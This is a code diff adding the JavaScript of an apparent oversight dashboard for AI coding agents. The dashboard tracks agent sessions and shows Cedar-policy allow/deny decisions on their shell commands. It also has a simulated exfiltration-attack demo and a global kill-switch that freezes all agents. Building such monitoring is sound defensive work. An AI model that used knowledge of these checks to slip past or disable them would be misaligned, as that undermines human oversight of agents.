+      if (chipsContainer) {
+        if (totalActive === 0) {
+          chipsContainer.innerHTML = '<span class="text-xs text-slate-500 font-mono italic">No active sessions (All workloads deregistered)</span>';
+        } else {
+          chipsContainer.innerHTML = "";
+          const isDense = totalActive >= 15;
+          activeSessions.forEach(s => {
+            const isAg = (s.app_id || "").toLowerCase().includes("antigravity") || (s.session_id || "").toLowerCase().includes("antigravity");
+            const isClaude = (s.app_id || "").includes("claude");
+            const isCopilot = (s.app_id || "").includes("copilot");
+            const isPython = (s.app_id || "").includes("python");
+            const appLabel = isAg ? "Antigravity" : isClaude ? "Claude Code" : isCopilot ? "Copilot" : isPython ? "Python Agent" : (s.app_id || "AI Agent");
+            const avatarColor = isAg ? "bg-indigo-600 text-white shadow-indigo-500/50" : isClaude ? "bg-purple-600 text-purple-100" : isCopilot ? "bg-sky-600 text-sky-100" : isPython ? "bg-amber-600 text-amber-100" : "bg-emerald-600 text-emerald-100";
+
+            // Extract friendly username or instance name
+            const userOrInst = s.user_id || s.instance_id || (s.session_id || "").replace("sess-", "");
+            const displayName = userOrInst.includes(".") ? userOrInst.split(".")[0] : userOrInst.replace("laptop-", "").replace("node-", "");
+            const capitalizedName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
+
+            const chip = document.createElement("button");
+            if (isKillSwitchActive) {
+              chip.className = "px-2.5 py-1 rounded-xl bg-rose-950/70 border border-rose-500 text-xs font-mono flex items-center space-x-2 transition shadow-lg shadow-rose-950/50 glow-rose";
+              chip.innerHTML = `
+                <span class="w-4 h-4 rounded-full bg-rose-600 text-white flex items-center justify-center font-bold text-[9px]">⛔</span>
+                <span class="text-rose-200 font-bold">${escapeHtml(capitalizedName)}</span>
+                <span class="text-rose-400 text-[10px] font-bold">[FROZEN]</span>
+              `;
+            } else if (isDense) {
+              chip.className = "px-2 py-1 rounded-lg bg-slate-950/90 border border-slate-700 hover:border-cyan-400 shadow text-[11px] font-mono flex items-center space-x-1.5 transition group";
+              chip.innerHTML = `
+                <span class="w-3.5 h-3.5 rounded-full ${avatarColor} flex items-center justify-center font-bold text-[8px]">${appLabel[0]}</span>
+                <span class="text-slate-200 font-semibold group-hover:text-cyan-300">${escapeHtml(capitalizedName)}</span>
+                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+              `;
+            } else {
+              chip.className = "px-3 py-1.5 rounded-xl bg-slate-950 border border-emerald-500/60 hover:border-emerald-400 shadow-lg shadow-emerald-950/50 text-xs font-mono flex items-center space-x-2 transition group";
+              chip.innerHTML = `
+                <span class="w-5 h-5 rounded-full ${avatarColor} flex items-center justify-center font-bold text-[10px] shadow">${appLabel[0]}</span>
+                <span class="text-white font-bold group-hover:text-emerald-300">${escapeHtml(capitalizedName)} (${escapeHtml(appLabel)})</span>
+                <span class="text-slate-500 text-[10px]">[PID: ${s.client_pid || '?'}]</span>
+                <span class="relative flex h-2 w-2">
+                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                  <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                </span>
+              `;
+            }
+            chip.title = `Workload: ${s.session_id} | User: ${s.user_email || s.user_id || 'N/A'}`;
+            chip.addEventListener("click", () => {
+              if (filterSessionSelect) filterSessionSelect.value = s.session_id;
+              currentFilterSession = s.session_id;
+              document.getElementById("tab-btn-timeline").click();
+              renderTimeline();
+            });
+            chipsContainer.appendChild(chip);
+          });
+        }
+      }
+
+      // Highlight Node 1 in Topological Pipeline if active
+      if (nodeAgent && totalActive > 0) {
+        const topAgent = activeSessions[0];
+        const isAg = (topAgent.app_id || "").toLowerCase().includes("antigravity") || (topAgent.session_id || "").toLowerCase().includes("antigravity");
+        const isClaude = (topAgent.app_id || "").includes("claude");
+        const isCopilot = (topAgent.app_id || "").includes("copilot");
+        const isPython = (topAgent.app_id || "").includes("python");
+        const agentName = isAg ? "Antigravity IDE" : isClaude ? "Claude Code" : isCopilot ? "Copilot CLI" : isPython ? "Python Agent" : (topAgent.app_id || "Live Agent");
+        document.getElementById("flow-agent-name").textContent = agentName;
+        document.getElementById("flow-agent-pid").textContent = `PID: ${topAgent.client_pid || 'Active'}`;
+        nodeAgent.classList.add("border-emerald-500", "shadow-lg", "shadow-emerald-950/50");
+      }
+    }
+
+    // --- RENDER LIVE AGENT SESSIONS ---
+    function renderSessions(sessions) {
+      allLiveSessions = sessions || [];
+      const countPill = document.getElementById("sessions-count-pill");
+      const activeBadge = document.getElementById("sessions-active-badge");
+      const container = document.getElementById("sessions-container");
+
+      let activeCount = 0;
+      allLiveSessions.forEach(s => { if (s.status === "active") activeCount++; });
+      if (countPill) countPill.textContent = activeCount;
+      if (activeBadge) activeBadge.textContent = `${activeCount} ACTIVE`;
+
+      // Update Session Dropdown in Filter Ribbon
+      if (filterSessionSelect) {
+        const currentVal = filterSessionSelect.value;
+        filterSessionSelect.innerHTML = '<option value="all">All Sessions</option>';
+        allLiveSessions.forEach(s => {
+          const opt = document.createElement("option");
+          opt.value = s.session_id;
+          opt.textContent = `${s.session_id} (${s.app_id || s.status})`;
+          if (s.session_id === currentVal) opt.selected = true;
+          filterSessionSelect.appendChild(opt);
+        });
+      }
+
+      if (!container) return;
+      if (allLiveSessions.length === 0) {
+        container.innerHTML = `
+          <div class="col-span-full py-8 text-center text-slate-500 text-xs font-mono">
+            No agent sessions recorded yet. Launch Antigravity, Claude Code (<code>run_claude_ollama.bat</code>), or Copilot to see live session tracking.
+          </div>
+        `;
+        return;
+      }
+
+      container.innerHTML = "";
+      allLiveSessions.forEach(s => {
+        const isActive = s.status === "active";
+        const card = document.createElement("div");
+        card.className = `p-4 rounded-xl border transition ${
+          isActive 
+            ? 'bg-slate-900 border-emerald-500/50 shadow-lg shadow-emerald-950/30' 
+            : 'bg-slate-900/40 border-slate-800/80 opacity-70 hover:opacity-100'
+        } space-y-3`;
+
+        const started = s.started_at ? new Date(s.started_at).toLocaleTimeString() : "N/A";
+        const lastActive = s.last_active_at ? new Date(s.last_active_at).toLocaleTimeString() : started;
+
+        card.innerHTML = `
+          <div class="flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+              <span class="w-2.5 h-2.5 rounded-full ${isActive ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600'}"></span>
+              <span class="font-bold text-white text-xs font-mono">${escapeHtml(s.session_id)}</span>
+            </div>
+            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${
+              isActive ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' : 'bg-slate-800/90 text-slate-400 border border-slate-700'
+            }">
+              ${isActive ? '● ACTIVE (ENROLLED)' : '○ DEREGISTERED (CLOSED)'}
+            </span>
+          </div>
+
+          <div class="text-[11px] text-slate-300 font-mono space-y-1 bg-slate-950 p-2.5 rounded-lg border border-slate-800">
+            <div class="flex justify-between"><span class="text-slate-500">Agent:</span> <strong class="text-cyan-300">${escapeHtml(s.app_id || 'claude-code')}</strong></div>
+            <div class="flex justify-between"><span class="text-slate-500">User:</span> <strong class="text-amber-300">${escapeHtml(s.user_id || 'NA')}</strong></div>
+            ${s.spiffe_id && s.spiffe_id !== 'NA' ? `<div class="flex justify-between"><span class="text-slate-500">SPIFFE:</span> <span class="text-purple-300 text-[10px] truncate max-w-[140px]" title="${escapeHtml(s.spiffe_id)}">${escapeHtml(s.spiffe_id)}</span></div>` : ''}
+            <div class="flex justify-between"><span class="text-slate-500">PID:</span> <span>${s.client_pid || 'N/A'}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">Started:</span> <span>${started}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${isActive ? 'Last Action:' : 'Deregistered:'}</span> <span>${lastActive}</span></div>
+          </div>
+
+          <div class="flex items-center justify-between text-[11px] font-mono pt-1">
+            <div class="flex items-center space-x-2">
+              <span class="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-bold">${s.allowed_count || 0} ALLOW</span>
+              <span class="px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/30 font-bold">${s.denied_count || 0} DENY</span>
+            </div>
+            <button class="filter-to-sess-btn px-2.5 py-1 bg-slate-800 hover:bg-cyan-600/20 hover:text-cyan-300 hover:border-cyan-500/40 text-slate-300 rounded border border-slate-700 text-[10px] transition" data-session-id="${escapeHtml(s.session_id)}">
+              Inspect Stream &rarr;
+            </button>
+          </div>
+        `;
+
+        card.querySelector(".filter-to-sess-btn")?.addEventListener("click", () => {
+          if (filterSessionSelect) filterSessionSelect.value = s.session_id;
+          currentFilterSession = s.session_id;
+          document.getElementById("tab-btn-timeline").click();
+          renderTimeline();
+        });
+
+        container.appendChild(card);
+      });
+    }
+
+    // --- LOAD LIVE DATA FROM SERVER ---
+    function loadLiveData(data) {
+      const converted = [];
+      const sourceEvents = (data.edge_events && data.edge_events.length > 0) ? data.edge_events : (data.central_events || []);
+      if (sourceEvents.length > 0) {
+        sourceEvents.forEach((ev, idx) => {
+          converted.push({
+            id: ev.event_id || ("ev-live-" + idx),
+            session_id: ev.session_id || "",
+            user_id: ev.user_id || "NA",
+            spiffe_id: ev.spiffe_id || "NA",
+            timestamp: ev.timestamp || new Date().toISOString(),
+            source: ev.source || "bapedge",
+            category: "CEDAR_DECISION",
+            executable: ev.executable || "sh",
+            arguments: ev.arguments || "",
+            full_command: ev.full_command || ev.executable,
+            decision: ev.decision || "allow",
+            reason: ev.reason || (ev.decision === "allow" ? "Permitted by Cedar policy" : "Denied by security policy"),
+            duration_ms: ev.duration_ms || 1,
+            exit_code: ev.exit_code !== undefined ? ev.exit_code : 0,
+            client_pid: ev.client_pid || 0,
+            hash: ev.event_hash || ("live-hash-" + idx)
+          });
+        });
+      }
+
+      if (converted.length > 0) {
+        currentEvents = converted;
+        currentIndex = currentEvents.length - 1;
+        renderTimeline();
+        renderTopStats();
+        updateFlowVisualizer(currentEvents[currentIndex]);
+      }
+    }
+
+    // --- SCENARIO LOADER ---
+    function updateScenario(key) {
+      pausePlayback();
+      if (key === "live") {
+        checkLiveConnection();
+        startLivePolling();
+        return;
+      }
+      stopLivePolling();
+      if (SCENARIOS[key]) {
+        currentEvents = [...SCENARIOS[key]];
+        currentIndex = 0;
+        timelineSlider.max = currentEvents.length - 1;
+        timelineSlider.value = 0;
+        renderTimeline();
+        renderTopStats();
+        renderFleetTable();
+        renderHashChain();
+        updateFlowVisualizer(currentEvents[currentIndex]);
+      }
+    }
+
+    function startLivePolling() {
+      if (!livePollInterval) {
+        livePollInterval = setInterval(checkLiveConnection, 2000);
+      }
+    }
+
+    function stopLivePolling() {
+      if (livePollInterval) {
+        clearInterval(livePollInterval);
+        livePollInterval = null;
+      }
+    }
+
+    // --- EVENT LISTENERS ---
+    function setupEventListeners() {
+      btnPlayPause.addEventListener("click", togglePlayPause);
+      btnReset.addEventListener("click", () => { pausePlayback(); jumpToIndex(0); });
+      btnEnd.addEventListener("click", () => { pausePlayback(); jumpToIndex(currentEvents.length - 1); });
+      btnStepBack.addEventListener("click", () => { pausePlayback(); if (currentIndex > 0) jumpToIndex(currentIndex - 1); });
+      btnStepFwd.addEventListener("click", () => { pausePlayback(); if (currentIndex < currentEvents.length - 1) jumpToIndex(currentIndex + 1); });
+
+      timelineSlider.addEventListener("input", (e) => {
+        pausePlayback();
+        jumpToIndex(parseInt(e.target.value));
+      });
+
+      selectSpeed.addEventListener("change", (e) => {
+        playbackSpeed = parseInt(e.target.value);
+        if (isPlaying) {
+          pausePlayback();
+          startPlayback();
+        }
+      });
+
+      scenarioSelector.addEventListener("change", (e) => {
+        updateScenario(e.target.value);
+      });
+
+      btnRefreshLive.addEventListener("click", () => {
+        checkLiveConnection();
+      });
+
+      btnCloseDrawer.addEventListener("click", closeDrawer);
+
+      // Filter Buttons
+      document.querySelectorAll(".filter-src-btn").forEach(btn => {
+        btn.addEventListener("click", (e) => {
+          document.querySelectorAll(".filter-src-btn").forEach(b => {
+            b.className = "filter-src-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800";
+          });
+          btn.className = "filter-src-btn px-2.5 py-1 rounded-md bg-slate-800 text-white font-medium border border-slate-700";
+          currentFilterSource = btn.dataset.filterSrc;
+          renderTimeline();
+        });
+      });
+
+      document.querySelectorAll(".filter-dec-btn").forEach(btn => {
+        btn.addEventListener("click", (e) => {
+          document.querySelectorAll(".filter-dec-btn").forEach(b => {
+            b.className = "filter-dec-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800";
+          });
+          btn.className = "filter-dec-btn px-2.5 py-1 rounded-md bg-slate-800 text-white font-medium border border-slate-700";
+          currentFilterDecision = btn.dataset.filterDec;
+          renderTimeline();
+        });
+      });
+
+      // Filter Session Dropdown
+      if (filterSessionSelect) {
+        filterSessionSelect.addEventListener("change", (e) => {
+          currentFilterSession = e.target.value;
+          renderTimeline();
+        });
+      }
+
+      // Tab Switching
+      const tabs = [
+        { btn: "tab-btn-timeline", pane: "tab-pane-timeline" },
+        { btn: "tab-btn-sessions", pane: "tab-pane-sessions" },
+        { btn: "tab-btn-fleet", pane: "tab-pane-fleet" },
+        { btn: "tab-btn-chain", pane: "tab-pane-chain" },
+        { btn: "tab-btn-cedar", pane: "tab-pane-cedar" }
+      ];
+      tabs.forEach(tab => {
+        const btnElem = document.getElementById(tab.btn);
+        const paneElem = document.getElementById(tab.pane);
+        if (btnElem && paneElem) {
+          btnElem.addEventListener("click", () => {
+            tabs.forEach(t => {
+              const b = document.getElementById(t.btn);
+              const p = document.getElementById(t.pane);
+              if (b) b.className = "tab-btn px-4 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition flex items-center space-x-1.5";
+              if (p) p.classList.add("hidden");
+            });
+            btnElem.className = "tab-btn px-4 py-2 text-xs font-bold rounded-lg bg-cyan-600/20 text-cyan-300 border border-cyan-500/30 transition flex items-center space-x-1.5";
+            paneElem.classList.remove("hidden");
+          });
+        }
+      });
+
+      // --- EXECUTIVE DEMO CONTROLS ---
+      const btnExecSafe = document.getElementById("btn-exec-safe");
+      if (btnExecSafe) {
+        btnExecSafe.addEventListener("click", async () => {
+          try {
+            const resp = await fetch("/api/v1/demo/exec-safe", { method: "POST" });
+            const data = await resp.json();
+            if (resp.status === 403 || data.error === "KillSwitchActive") {
+              showToast("🚨 EXECUTION BLOCKED BY KILL-SWITCH", "All agent operations are frozen globally by CISO emergency override.", "deny");
+              flashEmergencyAlert();
+              return;
+            }
+            triggerSafeAnimation(data);
+            showToast("⚡ ZERO-FRICTION PASS (< 1.4ms)", "Complex multi-stage pipeline approved by Cedar without developer delay.", "agent_start");
+            incrementCounter("stat-allowed");
+            incrementCounter("stat-total-events");
+            setTimeout(checkLiveConnection, 300);
+          } catch (e) {
+            console.error(e);
+          }
+        });
+      }
+
+      const btnExecAttack = document.getElementById("btn-exec-attack");
+      if (btnExecAttack) {
+        btnExecAttack.addEventListener("click", async () => {
+          try {
+            const resp = await fetch("/api/v1/demo/exec-attack", { method: "POST" });
+            const data = await resp.json();
+            triggerAttackAnimation(data);
+            showToast("🚨 ROGUE ATTACK BLOCKED BY GATEWAY PEP", "Unauthorized credential exfiltration & egress dropped at perimeter. Target service NEVER reached.", "deny");
+            incrementCounter("stat-denied");
+            incrementCounter("stat-total-events");
+            setTimeout(checkLiveConnection, 300);
+          } catch (e) {
+            console.error(e);
+          }
+        });
+      }
+
+      let currentFleetScale = 5;
+      const btnToggleScale = document.getElementById("btn-toggle-scale");
+      if (btnToggleScale) {
+        btnToggleScale.addEventListener("click", async () => {
+          const target = currentFleetScale === 5 ? 25 : 5;
+          try {
+            const resp = await fetch("/api/v1/demo/fleet-scale", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ count: target })
+            });
+            if (resp.ok) {
+              currentFleetScale = target;
+              const lbl = document.getElementById("label-scale-btn");
+              const dsc = document.getElementById("desc-scale-btn");
+              if (lbl) lbl.textContent = target === 25 ? "👥 Switch to 5 Agents (Core)" : "👥 Scale to 25 Agents";
+              if (dsc) dsc.textContent = target === 25 ? "Enterprise high-density mesh active" : "Standard developer squad view";
+              showToast(
+                `👥 ENTERPRISE SCALE: ${target} AGENTS`,
+                target === 25 ? "Simulating 25 active concurrent developer workloads across 5 business squads with sub-2ms governance." : "Restored core 5-agent developer squad view.",
+                "agent_start"
+              );
+              setTimeout(checkLiveConnection, 200);
+            }
+          } catch (e) {
+            console.error(e);
+          }
+        });
+      }
+
+      const btnToggleKill = document.getElementById("btn-toggle-killswitch");
+      const btnBannerRestore = document.getElementById("btn-banner-restore");
+      const toggleKillAction = async () => {
+        const nextState = !isKillSwitchActive;
+        try {
+          const resp = await fetch("/api/v1/control/kill-switch", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ enabled: nextState })
+          });
+          if (resp.ok) {
+            updateKillSwitchUI(nextState);
+            if (nextState) {
+              showToast("🚨 EMERGENCY KILL-SWITCH ENGAGED", "All agent execution frozen globally by CISO override. Zero-Trust perimeter active.", "deny");
+            } else {
+              showToast("✅ FLEET GOVERNANCE RESTORED", "Emergency freeze lifted. Agent execution permitted under Cedar invariants.", "agent_start");
+            }
+            setTimeout(checkLiveConnection, 200);
+          }
+        } catch (e) {
+          console.error(e);
+        }
+      };
+      if (btnToggleKill) btnToggleKill.addEventListener("click", toggleKillAction);
+      if (btnBannerRestore) btnBannerRestore.addEventListener("click", toggleKillAction);
+
+      const btnVerifyChainQuick = document.getElementById("btn-verify-chain-quick");
+      if (btnVerifyChainQuick) {
+        btnVerifyChainQuick.addEventListener("click", async () => {
+          try {
+            const resp = await fetch("/api/v1/control/chain/verify");
+            const data = await resp.json();
+            if (data.valid) {
+              showToast(
+                "🔐 SHA-256 MERKLE CHAIN: 100% VALID",
+                `Cryptographic audit chain verified across ${data.total_events} events. Zero tampering detected. SOC 2 / ISO compliant.`,
+                "agent_start"
+              );
+              const chainBadge = document.getElementById("chain-validation-badge");
+              if (chainBadge) {
+                chainBadge.classList.add("glow-emerald");
+                setTimeout(() => chainBadge.classList.remove("glow-emerald"), 3000);
+              }
+              const metricChain = document.getElementById("metric-chain-state");
+              if (metricChain) metricChain.textContent = "100% VERIFIED";
+            }
+          } catch (e) {
+            console.error(e);
+          }
+        });
+      }
+    }
+
+    // --- PLAYBACK CONTROL ---
+    function togglePlayPause() {
+      if (isPlaying) {
+        pausePlayback();
+      } else {
+        startPlayback();
+      }
+    }
+
+    function startPlayback() {
+      if (currentIndex >= currentEvents.length - 1) {
+        currentIndex = 0;
+      }
+      isPlaying = true;
+      iconPlay.classList.add("hidden");
+      iconPause.classList.remove("hidden");
+      textPlay.textContent = "Pause";
+
+      playbackInterval = setInterval(() => {
+        if (currentIndex < currentEvents.length - 1) {
+          jumpToIndex(currentIndex + 1);
+        } else {
+          pausePlayback();
+        }
+      }, playbackSpeed);
+    }
+
+    function pausePlayback() {
+      isPlaying = false;
+      if (playbackInterval) {
+        clearInterval(playbackInterval);
+        playbackInterval = null;
+      }
+      iconPlay.classList.remove("hidden");
+      iconPause.classList.add("hidden");
+      textPlay.textContent = "Play";
+    }
+
+    function jumpToIndex(idx) {
+      if (idx < 0) idx = 0;
+      if (idx >= currentEvents.length) idx = currentEvents.length - 1;
+      currentIndex = idx;
+      timelineSlider.value = idx;
+      playbackCounter.textContent = `${idx + 1} / ${currentEvents.length}`;
+      updateFlowVisualizer(currentEvents[idx]);
+      highlightActiveEventCard(idx);
+    }
+
+    // --- FLOW VISUALIZER ANIMATION ---
+    function updateFlowVisualizer(ev) {
+      if (!ev) return;
+
+      const isDeny = ev.decision === "deny";
+      const isAllowed = ev.decision === "allow";
+
+      // Nodes
+      const nodeAgent = document.getElementById("node-agent");
+      const nodeHook = document.getElementById("node-hook");
+      const nodeEdge = document.getElementById("node-edge");
+      const nodeCedar = document.getElementById("node-cedar");
+      const nodeDest = document.getElementById("node-dest");
+
+      // Reset styles
+      [nodeAgent, nodeHook, nodeEdge, nodeCedar, nodeDest].forEach(n => {
+        n.className = "bg-slate-800/80 border-2 border-slate-700 rounded-xl p-3.5 text-center transition-all duration-300";
+      });
+
+      document.getElementById("flow-agent-name").textContent = ev.source || "AI Agent";
+      document.getElementById("flow-agent-pid").textContent = "PID: " + (ev.client_pid || "24000");
+      document.getElementById("flow-command").textContent = ev.full_command || ev.executable;
+      document.getElementById("flow-duration").textContent = (ev.duration_ms || 1) + "ms";
+      document.getElementById("flow-exit-code").textContent = ev.exit_code !== undefined ? ev.exit_code : (isDeny ? 1 : 0);
+
+      const badge = document.getElementById("flow-decision-badge");
+      const statusBanner = document.getElementById("flow-status-banner");
+
+      if (isDeny) {
+        badge.textContent = "BLOCKED / DENY";
+        badge.className = "px-2 py-0.5 rounded text-rose-400 bg-rose-500/10 border border-rose-500/30";
+        statusBanner.textContent = "⛔ ZERO-TRUST SHIELD: Pre-Process Interception Denied (" + (ev.duration_ms || 1) + "ms)";
+        statusBanner.className = "text-xs px-3 py-1 rounded-full font-mono bg-rose-950/60 text-rose-300 border border-rose-800/60 font-bold";
+
+        nodeAgent.className = "bg-slate-800 border-2 border-slate-600 rounded-xl p-3.5 text-center";
+        nodeHook.className = "bg-slate-800 border-2 border-amber-600/60 rounded-xl p-3.5 text-center";
+        nodeEdge.className = "bg-rose-950/40 border-2 border-rose-500 rounded-xl p-3.5 text-center glow-rose";
+        nodeCedar.className = "bg-rose-950/50 border-2 border-rose-500 rounded-xl p-3.5 text-center glow-rose";
+        nodeDest.className = "bg-slate-900/40 border-2 border-slate-800 rounded-xl p-3.5 text-center opacity-40";
+
+        document.getElementById("flow-decision-text").textContent = "DENY (Blocked)";
+        document.getElementById("flow-cedar-rule").textContent = "Cedar Forbid Clause";
+        document.getElementById("flow-target-status").textContent = "Blocked (No Shell Spawn)";
+      } else {
+        badge.textContent = "ALLOWED";
+        badge.className = "px-2 py-0.5 rounded text-emerald-400 bg-emerald-500/10 border border-emerald-500/30";
+        statusBanner.textContent = "✓ ZERO-TRUST VERIFIED: Permitted Execution Active (" + (ev.duration_ms || 1) + "ms)";
+        statusBanner.className = "text-xs px-3 py-1 rounded-full font-mono bg-emerald-950/60 text-emerald-300 border border-emerald-800/60 font-bold";
+
+        nodeAgent.className = "bg-slate-800 border-2 border-slate-600 rounded-xl p-3.5 text-center";
+        nodeHook.className = "bg-slate-800 border-2 border-cyan-600/60 rounded-xl p-3.5 text-center";
+        nodeEdge.className = "bg-emerald-950/30 border-2 border-emerald-500 rounded-xl p-3.5 text-center";
+        nodeCedar.className = "bg-emerald-950/40 border-2 border-emerald-500 rounded-xl p-3.5 text-center glow-emerald";
+        nodeDest.className = "bg-emerald-950/50 border-2 border-emerald-400 rounded-xl p-3.5 text-center glow-emerald";
+
+        document.getElementById("flow-decision-text").textContent = "PERMIT";
+        document.getElementById("flow-cedar-rule").textContent = "Cedar Toolchain Permit";
+        document.getElementById("flow-target-status").textContent = "Executed (Exit 0)";
+      }
+    }
+
+    // --- TIMELINE RENDERING ---
+    function renderTimeline() {
+      eventCardsContainer.innerHTML = "";
+      timelineSlider.max = currentEvents.length - 1;
+      timelineSlider.value = currentIndex;
+      playbackCounter.textContent = `${currentIndex + 1} / ${currentEvents.length}`;
+
+      currentEvents.forEach((ev, idx) => {
+        // Filtering
+        if (currentFilterSource !== "all") {
+          if (currentFilterSource === "antigravity" && !ev.source.includes("antigravity")) return;
+          if (currentFilterSource === "claude-code" && !ev.source.includes("claude")) return;
+          if (currentFilterSource === "copilot" && !ev.source.includes("copilot")) return;
+          if (currentFilterSource === "cli" && !ev.source.includes("cli") && !ev.source.includes("bapedge")) return;
+          if (currentFilterSource === "controlplane" && !ev.source.includes("controlplane")) return;
+        }
+        if (currentFilterDecision !== "all") {
+          if (currentFilterDecision === "allow" && ev.decision !== "allow") return;
+          if (currentFilterDecision === "deny" && ev.decision !== "deny") return;
+        }
+        if (currentFilterSession !== "all") {
+          if (ev.session_id && ev.session_id !== currentFilterSession) return;
+        }
+
+        const isDeny = ev.decision === "deny";
+        const isCurrent = idx === currentIndex;
+
+        const card = document.createElement("div");
+        card.id = `event-card-${idx}`;
+        card.className = `p-3.5 rounded-xl border transition cursor-pointer flex flex-col md:flex-row items-start md:items-center justify-between gap-3 text-xs ${
+          isCurrent 
+            ? (isDeny ? 'bg-rose-950/30 border-rose-500/80 shadow-lg shadow-rose-950/50' : 'bg-emerald-950/30 border-emerald-500/80 shadow-lg shadow-emerald-950/50')
+            : 'bg-slate-900 border-slate-800 hover:border-slate-700 hover:bg-slate-850'
+        }`;
+
+        const badgeClass = isDeny 
+          ? "bg-rose-500/10 text-rose-400 border-rose-500/30"
+          : "bg-emerald-500/10 text-emerald-400 border-emerald-500/30";
+
+        const isAgSource = (ev.source || "").toLowerCase().includes("antigravity");
+        const srcBadgeClass = isAgSource 
+          ? "bg-indigo-950/80 text-indigo-300 border border-indigo-700/60 font-semibold" 
+          : "bg-slate-800 text-cyan-300 border border-slate-700";
+
+        card.innerHTML = `
+          <div class="flex items-center space-x-2.5 w-full md:w-auto">
+            <span class="font-mono text-slate-500 text-[11px]">#${idx + 1}</span>
+            <span class="px-2 py-0.5 rounded font-bold uppercase text-[10px] border ${badgeClass}">
+              ${ev.decision.toUpperCase()}
+            </span>
+            <span class="px-2 py-0.5 rounded text-[10px] font-mono ${srcBadgeClass}">
+              ${ev.source}
+            </span>
+            ${ev.session_id ? `<span class="px-1.5 py-0.5 rounded text-[9px] font-mono bg-purple-950/80 text-purple-300 border border-purple-800/50 truncate max-w-[130px]" title="${escapeHtml(ev.session_id)}">${escapeHtml(ev.session_id)}</span>` : ''}
+            ${ev.user_id && ev.user_id !== 'NA' ? `<span class="px-1.5 py-0.5 rounded text-[9px] font-mono bg-amber-950/80 text-amber-300 border border-amber-800/50 truncate max-w-[100px]" title="User: ${escapeHtml(ev.user_id)}">👤 ${escapeHtml(ev.user_id)}</span>` : ''}
+            <code class="font-bold text-slate-200 text-sm font-mono truncate max-w-xs md:max-w-md">${escapeHtml(ev.full_command || ev.executable)}</code>
+          </div>
+
+          <div class="flex items-center space-x-4 text-slate-400 font-mono text-[11px] self-end md:self-auto">
+            <span>${ev.duration_ms || 1}ms</span>
+            <span class="truncate max-w-[200px] text-slate-500">${escapeHtml(ev.reason || "")}</span>
+            <button class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-cyan-400 rounded border border-slate-700 text-[10px]">Inspect</button>
+          </div>
+        `;
+
+        card.addEventListener("click", () => {
+          jumpToIndex(idx);
+          openDrawer(ev);
+        });
+
+        eventCardsContainer.appendChild(card);
+      });
+    }
+
+    function highlightActiveEventCard(idx) {
+      document.querySelectorAll("#event-cards-container > div").forEach(card => {
+        card.classList.remove("border-emerald-500/80", "border-rose-500/80", "bg-emerald-950/30", "bg-rose-950/30", "shadow-lg");
+        card.classList.add("border-slate-800", "bg-slate-900");
+      });
+      const activeCard = document.getElementById(`event-card-${idx}`);
+      if (activeCard) {
+        const ev = currentEvents[idx];
+        const isDeny = ev && ev.decision === "deny";
+        activeCard.classList.remove("border-slate-800", "bg-slate-900");
+        activeCard.classList.add(
+          isDeny ? "border-rose-500/80" : "border-emerald-500/80",
+          isDeny ? "bg-rose-950/30" : "bg-emerald-950/30",
+          "shadow-lg"
+        );
+        activeCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
+      }
+    }
+
+    // --- TOP STATS ---
+    function renderTopStats() {
+      let allowed = 0;
+      let denied = 0;
+      currentEvents.forEach(e => {
+        if (e.decision === "allow") allowed++;
+        else if (e.decision === "deny") denied++;
+      });
+      document.getElementById("stat-total-events").textContent = currentEvents.length;
+      document.getElementById("stat-allowed").textContent = allowed;
+      document.getElementById("stat-denied").textContent = denied;
+    }
+
+    // --- FLEET TABLE ---
+    function renderFleetTable() {
+      const tbody = document.getElementById("fleet-table-body");
+      const sampleFleet = [
+        {
+          id: "agent-claude-worker-01",
+          app_id: "claude-code-worker",
+          instance_id: "node-laptop-01",
+          spiffe_id: "spiffe://bap.internal/app/claude-code-worker/instance/node-laptop-01",
+          status: "active",
+          binary_hash: "f74e45ee7ca017e225b72a0107529469ae612c308ded4b0221c60e85ccdf9584",
+          last_heartbeat: "Just now (Alive)"
+        },
+        {
+          id: "agent-copilot-dev-02",
+          app_id: "copilot-cli-fleet",
+          instance_id: "node-worker-02",
+          spiffe_id: "spiffe://bap.internal/app/copilot-cli-fleet/instance/node-worker-02",
+          status: "active",
+          binary_hash: "f74e45ee7ca017e225b72a0107529469ae612c308ded4b0221c60e85ccdf9584",
+          last_heartbeat: "12s ago (Alive)"
+        },
+        {
+          id: "agent-fleet-deployer-node-01",
+          app_id: "fleet-deployer",
+          instance_id: "node-01",
+          spiffe_id: "spiffe://bap.internal/app/fleet-deployer/instance/node-01",
+          status: "revoked",
+          binary_hash: "f74e45ee7ca017e225b72a0107529469ae612c308ded4b0221c60e85ccdf9584",
+          last_heartbeat: "Kill-Switch Activated"
+        }
+      ];
+
+      tbody.innerHTML = "";
+      sampleFleet.forEach(f => {
+        const isRevoked = f.status === "revoked";
+        const tr = document.createElement("tr");
+        tr.className = "hover:bg-slate-800/50";
+        tr.innerHTML = `
+          <td class="px-4 py-3 font-mono text-slate-200 font-medium">${f.id}</td>
+          <td class="px-4 py-3 font-semibold text-cyan-400">${f.app_id}</td>
+          <td class="px-4 py-3 font-mono text-slate-300">${f.instance_id}</td>
+          <td class="px-4 py-3 font-mono text-purple-300 font-semibold">${f.spiffe_id}</td>
+          <td class="px-4 py-3">
